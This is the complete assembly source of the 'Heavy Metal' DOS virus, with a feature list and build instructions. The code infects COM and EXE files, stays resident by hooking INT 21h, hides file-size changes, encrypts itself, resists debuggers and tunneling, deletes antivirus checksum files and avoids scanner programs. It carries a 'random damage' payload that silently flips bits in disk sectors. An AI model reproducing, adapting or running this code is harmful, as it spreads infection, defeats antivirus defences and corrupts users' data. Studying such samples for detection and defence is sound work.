Comment #
        ÄÒ ÄÂ ÖÄÄÄ  ÚÄÄ· ·  ÚÄ Ä¿  Ö    ÚÄÂÄÄÒÄÄ· ÖÄÄÄ ÚÄÄÒÄÄ¿ ÚÄÄ· Ä·   V
         º  ³ º     ³  º º  ³   ³  º      ³  º  º º       º    ³  º  º    I
         ÇÄÄ´ ÇÄ¿   ÃÄÄ¶ º  ³   ÀÄÄ¶      ³  Ð  º ÇÄ¿     º    ÃÄÄ¶  º     R
         º  ³ º     ³  º º  ³   Ú  º      ³     º º       º    ³  º  º      U
        ÄÐ ÄÁ ÓÄÄÄ ÄÙ  Ó ÈÍÍ¾   ÀÄÄ½      Á     Ð ÓÄÄÄ    Ð    Ù  Ó  ÓÄÄÙ    S
                       A paraguayan-bulgarian creation
ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
ÞÞÞÛÛÛÛÛÛÝÝÝÝÝÝ VIRUS BY: Int13h       PAYLOAD BY: Dark Avenger  ÝÝÝÝÝÛÛÛÛÛÛÛÞÞ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
        FEATURES                    ³
                                    ³
        * COM/EXE infector.     ÄÄÄÄÅÄÄÄÄ
        * TSR manipulating MCB.     Á
        * Semi-stealth with AH=11h/12h/4eh/4fh.
        * Self Encrypted, LOOP encrypted too.
        * Finds the original INT 21h's handler tracing PSP.
        * Anti-Debug, stack test and killing keyboard IRQ.
        * Infection on open, execution, rename, get/change
          attributes and extended open.
        * The victim is opened in read-only mode and then
          SFT is manipulated to change axs mode, get/kick
          attributes and move file pointer.
        * Uses some anti-tunneling techniques, like turning off
          the Trap Flag and killing INT 01h.
        * Infection mark in the seconds field.
        * Deleting of some antivirus checksum files in each
          directory where a file is infected.
        * INT 24h redirection to stop write protects msgs.
        * Don't infect WINSLOW's fucking files.
        * Avoids infection of the suckers *AV, *AN, etc.
        * SLOW DESTRUCTION!!!
        * The payload by DAV is commented in cyrilic. Looks great ;-)


     Assembling it:

                        TASM heavy.asm /m2
                        TLINK heavy.obj


   ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´

     Dark Avenger: thanks for the cool and excellent payload, but I still
                   think HäLLOWääN is better than IRON MAIDEN ;-)
                Up the pumpkins! Pumpkins...lives somewhere in time.
    Also Stratovarius, Blind Guardian, Heaven Gates and Running Wild rocks!
        And I can't forget Gamma Ray, Angra, Bar¢n Rojo & King Diamond.
                    HEAVY METAL IS THE LAW! (Kai Hansen dixit)

           ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
                P.S.: this viruz is rather old, more than one year.
#

.model tiny
.code
org 0

Crypted      equ  ((offset EndVirus-offset Encrypted_Stuff)/2)
SkipThese    equ  (offset Encrypted_Stuff-offset HeavyMetal)
RealSize     equ  (offset EndVirus-Offset HeavyMetal)
ViralSize    equ  (offset Huesped-offset HeavyMetal)
ParaVir1     equ  ((ViralSize+15)/16)+1
ParaVir2     equ  ((ViralSize+15)/16)
VirusInPara  equ  (RealSize+15)/16

HeavyMetal:
        mov bp,sp                       ; Get delta offset
        int 03h
        mov bp,word ptr SS:[bp-06]
        sub bp,03

        mov ah,2                        ; Shut up TBAV
        int 16h
        push cs                         ; Make DS equal to CS
        pop ds

        lea si,[bp+offset Encrypted_Stuff]
        mov cx,Crypted

DECRYPTOR:
        db 081h,034h                    ; XOR WORD PTR [SI],KEYWORD
Keyword dw 0
        lodsw                           ; inc si / inc si
        int 01h                         ; Clear prefetch queue
Encrypted_Stuff:
        Loop DECRYPTOR                  ; LOOP encrypted too

        push es
        pop ds
        in al,21h                       ; Turn off Keyboard IRQ
        or al,02
        out 21h,al
        push si                         ; Stack test
        pop si
        dec sp
        dec sp
        pop di
        sub si,di
        jz All_is_OK

        db 02eh                         ; CS:
        int 019h                        ; Warm Reboot
        nop                             ; Gift 4 TBCLEAN

All_is_OK:
        mov ax,0cd13h                   ; Residence test
        int 21h
        cmp ax,'DA'
        jne Upload_Virus
        jmp Already_in_Memory


Upload_Virus:
        push es
        mov ax,3521h                    ; Get INT 21h's handler
        int 21h
        mov cs:[bp+word ptr Old21h],bx
        mov cs:[bp+word ptr Old21h+2],es
        mov cs:[bp+word ptr Real21h],bx
        mov cs:[bp+word ptr Real21h+2],es
        push ds

        lds bx,ds:[0006h]               ; Find INT 21h's handler tracing PSP
PSP_Tracing:                            ; With thanks to Satan's Little Helper.
        cmp byte ptr ds:[bx],0eah
        jne Check
        lds bx,ds:[bx+1]
        cmp word ptr ds:[bx],9090h
        jnz PSP_Tracing
        sub bx,032h
        cmp word ptr ds:[bx],9090h
        jne Check
Found:  mov cs:[bp+word ptr Real21h],bx
        mov cs:[bp+word ptr Real21h+2],ds
        jmp short MCBTSR
Check:  cmp word ptr ds:[bx],02e1eh
        jnz MCBTSR
        add bx,025h
        cmp word ptr ds:[bx],080fah
        je Found

MCBTSR: pop ds
        mov ax,ds
        dec ax                          ; MCB
        mov es,ax
        mov ax,es:[3]
        sub ax,ParaVir1
        xchg bx,ax
        push ds
        pop es
        mov ah,4ah
        int 21h
        mov ah,48h
        mov bx,ParaVir2
        int 21h

        dec ax
        mov es,ax
        mov word ptr es:[1],8
        mov word ptr es:[8],'HM'        ; Block name: Heavy Metal
        inc ax
        mov es,ax
        xor di,di

        push cs
        pop ds
        lea si,[bp+offset HeavyMetal]
        mov cx,ViralSize
        rep movsb                       ; Virus to ES:0

        int 03h

        push es
        pop ds
        mov ax,2521h                    ; Hook 21h
        mov dx,offset Viral21h
        int 21h

        pop es


Already_in_Memory:
        in al,21h                       ; Turn on keyboard IRQ
        and al,not 2
        out 21h,al

        in al,40h
        mov ah,al
        in al,40h
        test al,15
        jne Nope
        xor ax,cs:[bp+cs_ip]
        call Payload                    ; Mad Maniac rulez!

Nope:   cmp byte ptr cs:[bp+IsComOrExe],'C'
        je Run_COM

        push es
        pop ds

        mov bx,bp                       ; Return control to .EXE

        mov ax,es
        add ax,16d
        add cs:[(bx+CS_IP)+2],ax

        cli
        add ax,cs:[(bx+SS_SP)+2]
        mov ss,ax
        mov sp,cs:[bx+SS_SP]
        sti

        call Clear_Registers

        db 0ebh,0h
        db 0eah
        CS_IP dw offset Huesped,0h
        SS_SP dw 0,0


Run_COM:call SetSegments
        lea si,[bp+offset Buffer]       ; Return control to .COM
        mov di,100h
        push di
        cld
        movsb
        movsw

Clear_Registers:
        xor ax,ax
        xor bx,bx
        xor cx,cx
        xor dx,dx
        xor si,si
        xor di,di
        xor bp,bp
        ret



Fool_Jump2:
        jmp Stealth2
Fool_Jump3:
        jmp Analizar



Viral21h proc far                       ; Our 21h handler
        push ds
        push si
        push ax
        push bx
        pushf
        pop ax
        and ah,11111110b                ; Turn off Trap Flag
        push ax
        popf
        sub ax,ax
        mov ds,ax
        mov bx,4
        lds si,[bx]
        mov byte ptr [si],0cfh          ; IRET in 1h's handler
        pop bx
        pop ax
        pop si
        pop ds

        cmp ax,0cd13h                   ; Autocheck
        je TSRChecking
        cmp ah,11h                      ; Find first FCB
        je Stealth1
        cmp ah,12h                      ; Find next FCB
        je Stealth1
        cmp ah,4eh                      ; Find first DTA
        je Fool_Jump2
        cmp ah,4fh                      ; Find next DTA
        je Fool_Jump2
        cmp ax,04b00h                   ; Execution
        je Fool_Jump3
        cmp ah,056h                     ; Rename
        je Fool_Jump3
        cmp ah,043h                     ; Get/Change atributes
        je Fool_Jump3
        cmp ah,3dh                      ; Open
        je Fool_Jump3
        cmp ax,6c00h                    ; Extended open
        je Fool_Jump3
        db 0eah
        Old21h dw 0,0
TSRChecking:
        mov ax,'DA'                     ; Already resident
        iret
Viral21h endp




Stealth1:                               ; FCB stealth
        pushf
        push cs
        call Original_21h
        or al,al
        jne ErrorDir

        push ax
        push bx
        push es

        mov ah,62h
        int 21h

        mov es,bx
        cmp bx,es:[16h]
        jne Fuera

        mov bx,dx
        mov al,[bx]
        push ax

        mov ah,2fh
        int 21h
        pop ax
        inc al
        jne FCBComun
        add bx,7

FCBComun:
        mov al,byte ptr es:[bx+17h]
        and al,00011111b
        cmp al,00011110b
        jne Fuera

        mov ax,word ptr es:[bx+09h]
        cmp ax,'OC'
        jne Look4EXE1
        mov al,byte ptr es:[bx+0bh]
        cmp al,'M'
        je Label1
        jmp short Fuera

Look4EXE1:
        cmp ax,'XE'
        jne Fuera
        mov al,byte ptr es:[bx+0bh]
        cmp al,'E'
        jne Fuera


Label1: cmp word ptr es:[bx+1dh],RealSize
        ja Sustraer

        cmp word ptr es:[bx+1fh],0
        je Fuera

Sustraer:sub word ptr es:[bx+1dh],RealSize
         sbb word ptr es:[bx+1fh],0

Fuera:  pop es
        pop bx
        pop ax
ErrorDir:
        retf 2




Stealth2:                               ; DTA stealth
        pushf
        push cs
        call Original_21h
        jc Demonios

        pushf
        push ax
        push di
        push es
        push bx

        mov ah,2fh
        int 21h

        mov ax,es:[bx+16h]
        and al,00011111b
        cmp al,00011110b
        jne Paso

        mov di,bx
        add di,1eh
        cld
        mov cx,9
        mov al,'.'
        repne scasb
        jne Paso

        cmp word ptr es:[di],'OC'
        jne Look4EXE2
        cmp byte ptr es:[di+2],'M'
        je Label2
        jmp short Paso

Look4EXE2:
        cmp word ptr es:[di],'XE'
        jne Paso
        cmp byte ptr es:[di+2],'E'
        jne Paso


Label2: cmp word ptr es:[bx+1ah],(RealSize+512d)
        jb Paso

        sub word ptr es:[bx+1ah],RealSize
        sbb word ptr es:[bx+1ch],0000

Paso:   pop bx
        pop es
        pop di
        pop ax
        popf
Demonios:
        retf 2



Handler24h:                             ; Classic Viral Error Handler
        mov al,03
        iret



Fool_Jump4:
        jmp PopearTodo

Just_POP:
        jmp Just_Poping


Analizar:                               ; Check if we can infect it
        push ax
        push bx
        push cx
        push dx
        push si
        push di
        push ds
        push es

        cmp ax,6c00h
        jne Normal_Opening

        cmp dx,0001
        jne Just_POP

        mov dx,si

Normal_Opening:
        push dx
        push ds
        mov ax,3524h                    ; Get 24h's handler
        int 21h
        mov word ptr cs:[Old24h],bx
        mov word ptr cs:[Old24h+2],es
        push cs
        pop ds

        mov ax,2524h                    ; Redirect it
        mov dx,offset Handler24h
        int 21h

        pop ds
        pop dx
        push ds
        pop es
        cld
        mov di,dx
        mov cx,125
        mov al,'.'
        repne scasb
        jne Fool_Jump4

        mov ax,word ptr es:[di-3]       ; Look if is a sucker
        or ax,02020h
        cmp ax,'na'                     ; scAN, cleAN, tbscAN, tbcleAN
        je Fool_Jump4
        cmp ax,'va'                     ; nAV, tbAV
        je Fool_Jump4
        cmp ax,'to'                     ; f-prOT
        je Fool_Jump4
        cmp ax,'dr'                     ; guaRD
        je Fool_Jump4
        cmp ax,'ur'                     ; findviRU
        je Fool_Jump4
        cmp ax,'pv'                     ; aVP
        je Fool_Jump4
        cmp ax,'ti'                     ; toolkIT
        je Fool_Jump4
        cmp ax,'ni'                     ; wIN
        je Fool_Jump4
        cmp ax,'ga'                     ; defrAG
        je Fool_Jump4

        xchg si,di
        lodsw
        or ax,2020h
        cmp ax,'oc'
        jne Look4EXE3
        lodsb
        or al,20h
        cmp al,'m'                      ; .COM?
        je Label3
Fool_Jump5:
        jmp PopearTodo

Look4EXE3:
        cmp ax,'xe'
        jne Fool_Jump5
        lodsb
        or al,20h
        cmp al,'e'                      ; .EXE?
        jne Fool_Jump5

Label3: mov ax,3d00h
        pushf
        push cs
        call Original_21h
        jc Fool_Jump5
        xchg bx,ax
        mov word ptr cs:[Handle],bx

        push cs
        pop ds

        mov ax,4300h
        mov dx,offset Trash1
        sub cx,cx
        pushf
        push cs
        call Original_21h

        mov ah,41h                      ; Kill AV's checksum files
        mov dx,offset Trash1
        int 21h

        mov ah,41h
        mov dx,offset Trash2
        int 21h

        mov ah,41h
        mov dx,offset Trash3
        int 21h

        mov ah,41h
        mov dx,offset Trash4
        int 21h

        mov ax,5700h                    ; Unmask seconds
        int 21h
        mov word ptr cs:[Time],cx
        mov word ptr cs:[Date],dx
        and cl,00011111b
        cmp cl,00011110b
        jne Read_it
        jmp Fool_Jump6


Read_it:call SetSegments
        mov ah,3fh
        mov cx,1ah
        mov dx,offset EXEHeader
        int 21h

        mov si,dx

        cmp word ptr [SI],'ZM'
        je InfectEXE
        cmp word ptr [SI],'MZ'
        je InfectEXE


InfectCOM:
        call Pointer_to_EOF
        or dx,dx
        jne Fool_Jump6
        cmp ax,60000d
        ja Fool_Jump6
        cmp ax,029Ah                    ; Hi kewl spanish virus group! ;P
        jbe Fool_Jump6

        mov byte ptr [IsComOrExe],'C'
        mov si,offset EXEHeader         ; Copy to buffer the three bytes
        mov di,offset Buffer
        movsb
        movsw

        sub ax,3
        mov word ptr [Main_JMP+1],ax

        call Copy_to_Buffer             ; Encryption

        mov bx,[Handle]

        call Manipular_SFT

        mov ah,40h
        mov cx,RealSize
        mov dx,offset Microbio
        int 21h

        mov word ptr es:[di+015h],00    ; Reset pointer
        mov word ptr es:[di+017h],00

        mov ah,40h
        mov cx,3
        mov dx,offset Main_JMP
        int 21h

        mov cl,byte ptr [Attributes]    ; Return its attributes
        mov byte ptr es:[di+4],cl

        call SetDateTime
Fool_Jump6:
        jmp Cerrar



InfectEXE:
        cmp byte ptr [si+24],'@'        ; WINDOSUX's EXE?
        je Fool_Jump6

        mov byte ptr [IsComOrExe],'E'

        call Pointer_to_EOF
        push ax
        push dx

        les ax,dword ptr [EXEHeader+014h]
        mov [CS_IP],ax                  ; Infection in the habitual way
        mov [CS_IP+2],es
        les ax,dword ptr [EXEHeader+0eh]
        mov word ptr [SS_SP],es
        mov word ptr [SS_SP+2],ax

        mov ax,word ptr [EXEHeader+08h]
        mov cl,4
        shl ax,cl
        xchg bx,ax
        pop dx
        pop ax
        push ax
        push dx
        sub ax,bx
        sbb dx,0
        mov cx,10h
        div cx
        mov word ptr [EXEHeader+014h],dx
        mov word ptr [EXEHeader+016h],ax
        mov word ptr [EXEHeader+0eh],ax
        mov word ptr [EXEHeader+010h],0

        pop dx
        pop ax

        add ax,RealSize
        adc dx,0
        mov cl,9
        mov bx,ax
        shr ax,cl
        ror dx,cl
        or dx,dx
        stc
        adc dx,ax
        mov ax,bx
        and ah,1
        mov word ptr [EXEHeader+4],dx
        mov word ptr [EXEHeader+2],ax

        mov ax,word ptr [EXEHeader+0ah]
        add ax,VirusInPara
        jc NoAgregarMemoria
        mov word ptr [EXEHeader+0ah],ax
NoAgregarMemoria:
        mov word ptr [EXEHeader+0Ch],0ffffh

        call Copy_to_Buffer

        mov bx,[Handle]

        call Manipular_SFT

        mov ah,40h                      ; ADD file,virus
        mov cx,RealSize
        mov dx,offset Microbio
        int 21h

        mov word ptr es:[di+015h],00
        mov word ptr es:[di+017h],00

        mov ah,40h
        mov cx,01ah
        mov dx,offset EXEHeader
        int 21h

        mov cl,byte ptr [Attributes]
        mov byte ptr es:[di+4],cl

        call SetDateTime

Cerrar: mov ah,3eh
        int 21h


PopearTodo:
        push cs
        pop ds

        lds dx,dword ptr [Old24h]       ; Restore INT 24h's handler
        mov ax,2524h
        int 21h

Just_Poping:
        pop es
        pop ds
        pop di
        pop si
        pop dx
        pop cx
        pop bx
        pop ax
        jmp Original_21h                ; Go on with the real INT



SetDateTime:
        mov cx,word ptr cs:[Time]
        and cl,11100000b
        or cl,00011110b                 ; Mark as infected
        mov dx,word ptr cs:[Date]
        mov ax,5701h
        int 21h
        ret



Pointer_to_EOF:
        mov ax,04202h
        xor cx,cx
        cwd
        int 21h
        ret



Manipular_SFT:                          ; We change open mode and attributes
        push bx
        mov ax,1220h
        int 2fh

        mov ax,1216h
        xor bh,bh
        mov bl,es:[di]
        int 2fh

        mov cl,byte ptr es:[di+4]
        mov byte ptr [Attributes],cl
        mov byte ptr es:[di+4],20h
        mov byte ptr es:[di+2],2
        pop bx
        ret



Copy_to_Buffer:
        in al,40h
        mov ah,al
        in al,40h
        or ax,ax                        ; No 0 please
        je Copy_to_Buffer
        mov [Keyword],ax

        call SetSegments
        mov cx,(RealSize/2)
        xor si,si
        mov di,offset Microbio
        rep movsw                       ; Move to buffer

        mov cx,Crypted
        mov si,(offset Microbio+SkipThese)
        mov bx,[Keyword]
ENCRYPTOR:
        xor word ptr [si],bx
        lodsw                           ; inc si / inc si
        LOOP ENCRYPTOR
        ret


SetSegments:                            ; DS:= CS  &  ES = CS
        push cs
        push cs
        pop ds
        pop es
        ret

        db ' Read ORDER.DOC for registration '



; random damage, 27/02/97 by <dav>
;
; on entry:
;   bp = code base address
;   ax = random number (read from port 40h)
; on exit:
;   es, bp - preserved
;   cf = 1 if an error occured
;   other registers trashed
;   > 512 bytes of stack used

Payload:
        push    bp es
        sub     sp,512                  ; § ¥¬  ¬¿±²® §  ¡³´¥°
        lea     bx,[bp+int_13]
        xor     dx,dx
        mov     ds,dx
        xor     ax,ds:[46eh]
        xchg    si,ax
        mov     di,ds:[46ch]
        mov     bp,cs
        xor     bp,di                   ; si:bp = ±«³· ©­® ·¨±«®
        les     cx,ds:[7b4h]
        mov     ax,es
        cmp     ax,0f000h
        jz      short @@5
        cmp     ax,0c800h
        jz      short @@5
        les     cx,ds:[4ch]
@@5:    mov     cs:[bx],cx              ;  ¤°¥± ­  int 13 ¢ rom (¢¥°®¿²­®)
        mov     cs:[bx+2],ax
        push    ss
        pop     es
        mov     ax,ds:[43fh]
        shr     ax,1
        jc      @@1                     ; ¥¤­  ¤¨±ª¥²  ±¥ ¢º°²¨..
        inc     dx
        shr     ax,1
        jc      @@1
@@2:    mov     dl,80h
@@1:    push    di dx
        mov     ah,8
        int     13h
        pop     ax di
        jc      @@8
        xchg    al,dl
        or      dl,dl
        jns     @@3                     ; ¨§¡¨° ¬¥ ¤¨±ª¥² ² , ª®¿²® ±¥ ¢º°²¥¸¥
        and     ax,7fh
        call    getrand                 ; ¨­ ·¥, ¨§¡¨° ¬¥ ±«³· ¥­ ­®¬¥° ­  ¤¨±ª
        or      al,80h
        xchg    dx,ax
@@4:    push    dx
        mov     ah,8
        int     13h
        pop     ax
        jc      @@2
        mov     dl,al
@@3:    mov     al,cl
        and     ax,63
        call    getrand                 ; ±«³· ¥­ ­®¬¥° ­  ±¥ª²®°
        inc     ax
        xchg    ax,cx
        rol     al,1
        rol     al,1
        and     al,3
        xchg    al,ah
        inc     ax
        call    getrand                 ; ±«³· ¥­ ­®¬¥° ­  ¶¨«¨­¤º°·¥
        xchg    al,ah
        ror     al,1
        ror     al,1
        or      cx,ax
        mov     al,dh
        xor     ah,ah
        inc     ax
        call    getrand                 ; ±«³· ¥­ ­®¬¥° ­  £« ¢ ² 
        mov     dh,al
        mov     bx,sp
        mov     ax,201h
        int     13h
@@8:    jc      @@9
@@6:    mov     ax,1001h
        call    getrand                 ; ±«³· ¥­ ­®¬¥° ­  ¡¨²
        dec     ax
        js      @@7                     ; ¤  ­¥ ±¥ § ¶¨ª«¨¬  ª® ¨¬  ± ¬® ­³«¨
        xchg    cx,ax
        mov     bl,1
        rol     bl,cl
        xchg    ax,cx
        shr     ax,1
        shr     ax,1
        shr     ax,1
        add     ax,sp
        xchg    bx,ax
        test    ss:[bx],al
        jz      @@6                     ; ²®§¨ ¡¨² ¢¥·¥ ¥ ¨§²°¨², ¤ © ¬¨ ¤°³£
        not     al
        and     ss:[bx],al              ; ¨§²°¨¢ ¬¥ ¡¨² ...
        xor     bp,ss:[bx+1]
        xor     si,ss:[bx+3]
        mov     bx,sp
        mov     ax,301h
        pushf
        db      9ah                     ; ... ¨ £® § ¯¨±¢ ¬¥ ­  ¤¨±ª 
int_13  dw      24940, 25965
        jc      @@9
        or      dl,dl
        jns     @@9                     ; ±¢º°¸¢  ¢¥¤­ £   ª® ¥ ¯¨± « ­  ¤¨±ª¥² 
@@7:    lea     ax,[di+3]
        sub     ax,ds:[46ch]            ; ¨­ ·¥ ¯°®¤º«¦ ¢ ¬¥ ±º± ±º¹¨¿ ¤¨±ª
        ja      @@4                     ; ¤®ª ²® ¨§²¥·¥ ¯®­¥ 1/6 ±¥ª³­¤ 
@@9:    mov     bp,sp
        lea     sp,[bp+512]
        pop     es bp
        ret

getrand:                                ; thiz iz da k00l stuph...
        push    dx
        xchg    ax,si
        mov     dx,7
rloop:  shl     bp,1
        rcl     ax,1
        mov     bx,bp
        xor     bl,ah
        jns     rnext
        inc     bp
rnext:  dec     dx
        jnz     rloop
        xchg    si,ax
        mul     si
        xchg    ax,dx
        pop     dx
        ret

; --- end of random damage code ---


Original_21h:
           db 0eah
   Real21h dw 0,0
        ret

Copyright  db '[HEAVY_METAL Virus] by Int13h. Random Damage Code by DARK AVENGER!'
IsComOrExe db 'E'
Buffer     db 090h,0cdh,020h
Main_JMP   db 0e9h,00h,00h
Trash1     db 'ANTI-VIR.DAT',0
Trash2     db 'AVP.CRC',0
Trash3     db 'CHKLIST.MS',0
Trash4     db 'CHKLIST.CPS',0

EndVirus:
HELLOWEEN  dw 0
Handle     dw 0
Time       dw 0
Date       dw 0
Attributes db 0
Old24h     dd 0
Microbio   db RealSize dup('H')
EXEHeader  db 01ah dup(0)

Huesped:   mov ax,4c00h
           int 21h

end HeavyMetal
